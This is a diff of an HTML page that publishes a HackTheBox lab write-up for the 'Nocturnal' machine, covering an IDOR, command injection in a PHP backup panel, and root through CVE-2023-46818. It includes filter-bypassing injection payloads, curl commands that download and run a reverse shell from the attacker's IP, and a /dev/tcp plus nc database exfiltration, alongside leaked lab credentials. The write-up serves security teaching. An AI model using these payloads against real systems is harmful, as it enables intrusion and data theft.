@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>Nocturnal - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Nocturnal.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for Nocturnal machine from HackTheBox - Easy difficulty level">
+    <meta name="description" content="Detailed writeup for Nocturnal machine from HackTheBox - Easy difficulty level">
     <meta name="keywords" content="HackTheBox, Nocturnal, Easy, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,144 @@
         <h1 class="writeup-title">Nocturnal</h1>
         <div class="writeup-metadata">
             <span class="difficulty easy">Easy</span>
-            <span class="date">Active machine</span>
+            <span class="date">August 16, 2025</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
-                <p><img alt="Nocturnal" src="../images/Nocturnal/pwned.png" /></p>
-<p>Nocturnal is an <strong>ACTIVE</strong> machine!</p>
-<p>This write-up will go live once Nocturnal retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+                <p><img alt="pwned" src="../images/Nocturnal/pwned.png" /></p>
+<p>Nocturnal was an easy-difficulty Linux box featuring a file upload service. Initial reconnaissance revealed SSH on port 22 and a web application on port 80.</p>
+<p>After creating an account, I discovered an IDOR vulnerability in the file viewing functionality by manipulating the username parameter in /view.php.
+Username fuzzing revealed multiple users including Amanda, whose uploaded ODT document contained credentials amanda:arHkG7HAI68X8s1J.</p>
+<p>Authenticating as Amanda provided access to an administrative backup panel vulnerable to command injection. The backup functionality passed user-controlled password input directly to proc_open without proper sanitization.
+Bypassing character filters using tab characters instead of spaces, I achieved remote code execution via bash\t-c\t"curl%09http://10.10.16.64:8000/shell.sh" and obtained a reverse shell as the web user.</p>
+<p>Database enumeration revealed password hashes for user Tobias, which cracked to tobias:slowmotionapocalypse, providing SSH access and the user flag.</p>
+<p>Local enumeration identified ISPConfig running on localhost:8080. Research revealed CVE-2023-46818, a privilege escalation vulnerability affecting the control panel.
+Using the GitHub PoC with Tobias' credentials, I successfully exploited the CVE to gain root access, completing full system compromise.</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/Nocturnal/nmap.png" /></p>
+<p>Nmap scan reveals 2 ports. A website on 80, and SSH on 22.</p>
+<h2>Examining the website</h2>
+<p><img alt="website" src="../images/Nocturnal/website.png" /></p>
+<p>I created an account with credentials <code>test1:test</code>.</p>
+<p><img alt="files" src="../images/Nocturnal/files.png" /></p>
+<p>Since this is a website built with PHP, I tried uploading a PHP webshell, but it was denied with an error message.</p>
+<p><code>Invalid file type. pdf, doc, docx, xls, xlsx, odt are allowed.</code></p>
+<p>I uploaded a .pdf file, and noticed an unusual thing in the link to my file.</p>
+<p><img alt="upload" src="../images/Nocturnal/upload.png" /></p>
+<p>The download link contains my username and the filename. I tried swapping my username to admin to test whether I could look through other user's files.</p>
+<p><img alt="nofiles" src="../images/Nocturnal/nofiles.png" /></p>
+<h2>Fuzzing for valid users</h2>
+<p>While the admin did not have anything uploaded, it looks like I can see files uploaded by other users. I will use ffuf to fuzz the username parameter in order to find existing users.</p>
+<p><code>ffuf -w &lt;wordlist&gt; -u 'http://nocturnal.htb/view.php?username=FUZZ&amp;file=test.pdf' -H 'Cookie: &lt;cookie&gt;' -fw 1170</code></p>
+<p><img alt="fuzz" src="../images/Nocturnal/fuzz.png" /></p>
+<p>There are 6 users, including the admin. I'll check each of them, starting with Amanda.</p>
+<p><img alt="amanda" src="../images/Nocturnal/amanda.png" /></p>
+<p>Amanda has uploaded an .odt file. I'll download it and I will read through its contents.</p>
+<p><img alt="document" src="../images/Nocturnal/document.png" /></p>
+<p><code>amanda | arHkG7HAI68X8s1J</code></p>
+<h2>Creating a site backup</h2>
+<p>I tested these credentials on the website.</p>
+<p><img alt="login" src="../images/Nocturnal/login.png" /></p>
+<p>There is a link leading to the administrator panel at the top. I'll check it out right away.</p>
+<p><img alt="backup" src="../images/Nocturnal/backup.png" /></p>
+<p>I can create and download a backup of the site. It needs a password, so I'll use <code>test1</code></p>
+<p><img alt="backuped" src="../images/Nocturnal/backuped.png" /></p>
+<h2>Command execution via the password field</h2>
+<p>I reviewed the .php files, and found a vulnerability in admin.php.</p>
+<div class="codehilite"><pre><span></span><code><span class="nt">&lt;SNIP&gt;</span>
+
+<span class="cp">&lt;?php</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backup&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$password</span> <span class="o">=</span> <span class="nx">cleanEntry</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]);</span>
+    <span class="nv">$backupFile</span> <span class="o">=</span> <span class="s2">&quot;backups/backup_&quot;</span> <span class="o">.</span> <span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;.zip&quot;</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$password</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;&lt;div class=&#39;error-message&#39;&gt;Error: Try another password.&lt;/div&gt;&quot;</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nv">$logFile</span> <span class="o">=</span> <span class="s1">&#39;/tmp/backup_&#39;</span> <span class="o">.</span> <span class="nb">uniqid</span><span class="p">()</span> <span class="o">.</span> <span class="s1">&#39;.log&#39;</span><span class="p">;</span>
+
+        <span class="nv">$command</span> <span class="o">=</span> <span class="s2">&quot;zip -x &#39;./backups/*&#39; -r -P &quot;</span> <span class="o">.</span> <span class="nv">$password</span> <span class="o">.</span> <span class="s2">&quot; &quot;</span> <span class="o">.</span> <span class="nv">$backupFile</span> <span class="o">.</span> <span class="s2">&quot; .  &gt; &quot;</span> <span class="o">.</span> <span class="nv">$logFile</span> <span class="o">.</span> <span class="s2">&quot; 2&gt;&amp;1 &amp;&quot;</span><span class="p">;</span>
+
+        <span class="nv">$descriptor_spec</span> <span class="o">=</span> <span class="p">[</span>
+            <span class="mi">0</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s2">&quot;pipe&quot;</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">],</span> <span class="c1">// stdin</span>
+            <span class="mi">1</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s2">&quot;file&quot;</span><span class="p">,</span> <span class="nv">$logFile</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">],</span> <span class="c1">// stdout</span>
+            <span class="mi">2</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s2">&quot;file&quot;</span><span class="p">,</span> <span class="nv">$logFile</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">],</span> <span class="c1">// stderr</span>
+        <span class="p">];</span>
+
+        <span class="nv">$process</span> <span class="o">=</span> <span class="nb">proc_open</span><span class="p">(</span><span class="nv">$command</span><span class="p">,</span> <span class="nv">$descriptor_spec</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$process</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nb">proc_close</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span>
+        <span class="p">}</span>
+
+<span class="o">&lt;</span><span class="nx">SNIP</span><span class="o">&gt;</span>
+</code></pre></div>
+
+<p>It takes the data from a user-controlled password parameter and passes it directly to proc_open.</p>
+<div class="codehilite"><pre><span></span><code>&lt;SNIP&gt;
+
+function cleanEntry($entry) {
+    $blacklist_chars = [&#39;;&#39;, &#39;&amp;&#39;, &#39;|&#39;, &#39;$&#39;, &#39; &#39;, &#39;`&#39;, &#39;{&#39;, &#39;}&#39;, &#39;&amp;&amp;&#39;];
+
+    foreach ($blacklist_chars as $char) {
+        if (strpos($entry, $char) !== false) {
+            return false; // Malicious input detected
+        }
+    }
+
+    return htmlspecialchars($entry, ENT_QUOTES, &#39;UTF-8&#39;);
+}
+
+&lt;SNIP&gt;
+</code></pre></div>
+
+<p>While some characters are blacklisted, it should not be too hard to get code execution. I captured the create backup request in Burp and sent it to repeater.</p>
+<p>To confirm command execution, I'll use <code>bash -c "whoami"</code> in the password field.</p>
+<p>I swapped the two spaces with "+" signs, which are interpreted as spaces in urlencode. I then urlencoded the whole string</p>
+<p><img alt="burp" src="../images/Nocturnal/burp.png" /></p>
+<p>And it succeeded. However, the same way did not work when I tried to make the server call back to my listener.</p>
+<p>Instead, I pivoted to using tab(\t) characters, which are different characters than spaces and, as a result, should not be affected by the filter.</p>
+<p><code>bash\t-c\t"curl%09http://10.10.16.64:8000/test"</code></p>
+<p>The tab character in my curl command must be URL-encoded, otherwise it'll be treated as characters and will interfere with the url.</p>
+<p><img alt="curl" src="../images/Nocturnal/curl.png" /></p>
+<p>I'll repeat the working command, this time downloading a reverse shell.</p>
+<p><code>bash\t-c\t"curl%09http://10.10.16.64:8000/shell.sh%09-O\tshell.sh"</code></p>
+<p>After downloading, I'll execute it with a listener running on my box.</p>
+<p><code>bash\t-c\t"bash%09shell.sh"</code></p>
+<p><img alt="shell" src="../images/Nocturnal/shell.png" /></p>
+<h2>Downloading the database</h2>
+<p><img alt="find" src="../images/Nocturnal/find.png" /></p>
+<p>I transferred the database onto my machine and took all of the password hashes inside.</p>
+<div class="codehilite"><pre><span></span><code>cat &lt; /dev/tcp/10.10.16.64/9002 &gt; nocturnal_database.db - on target
+
+nc -lnkvp 9002 &gt; nocturnal_database.db - on host
+</code></pre></div>
+
+<p>There were 3 users. Amanda, admin, and Tobias. Tobias's hash cracked and revealed his password.</p>
+<p><code>tobias | slowmotionapocalypse</code></p>
+<p>I will try to SSH into the machine with these credentials.</p>
+<p><img alt="user" src="../images/Nocturnal/user.png" /></p>
+<h1>Root flag</h1>
+<h2>Initial recon</h2>
+<p>During my initial recon, I found a few ports listening locally.</p>
+<p><img alt="port" src="../images/Nocturnal/port.png" /></p>
+<p>I forwarded port 8080, as it's the most suspicious one here. I used port 8081 on my host to avoid conflicts with burpsuite, which is running on 8080.</p>
+<p><code>ssh tobias@nocturnal.htb -L 8081:127.0.0.1:8080</code></p>
+<p>However, when I tried to visit the website, I was denied.</p>
+<p><img alt="error" src="../images/Nocturnal/error.png" /></p>
+<p>I ran curl on my local machine to get some more info about what is running on this port.</p>
+<p><code>curl --head localhost:8081</code></p>
+<p><img alt="curly" src="../images/Nocturnal/curly.png" /></p>
+<p>The cookie name points me towards ispconfig, which is an open source hosting control panel for Linux.</p>
+<h2>Getting a root shell with CVE-2023-46818</h2>
+<p>A quick search for related CVEs brings me to an NVD record.</p>
+<p><code>https://nvd.nist.gov/vuln/detail/CVE-2023-46818</code></p>
+<p>And a PoC on GitHub.</p>
+<p><code>https://github.com/ajdumanhug/CVE-2023-46818</code></p>
+<p>The vulnerability needs administrative access. I have 2 different passwords to check, Amanda's and Tobias'.</p>
+<p><img alt="root" src="../images/Nocturnal/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
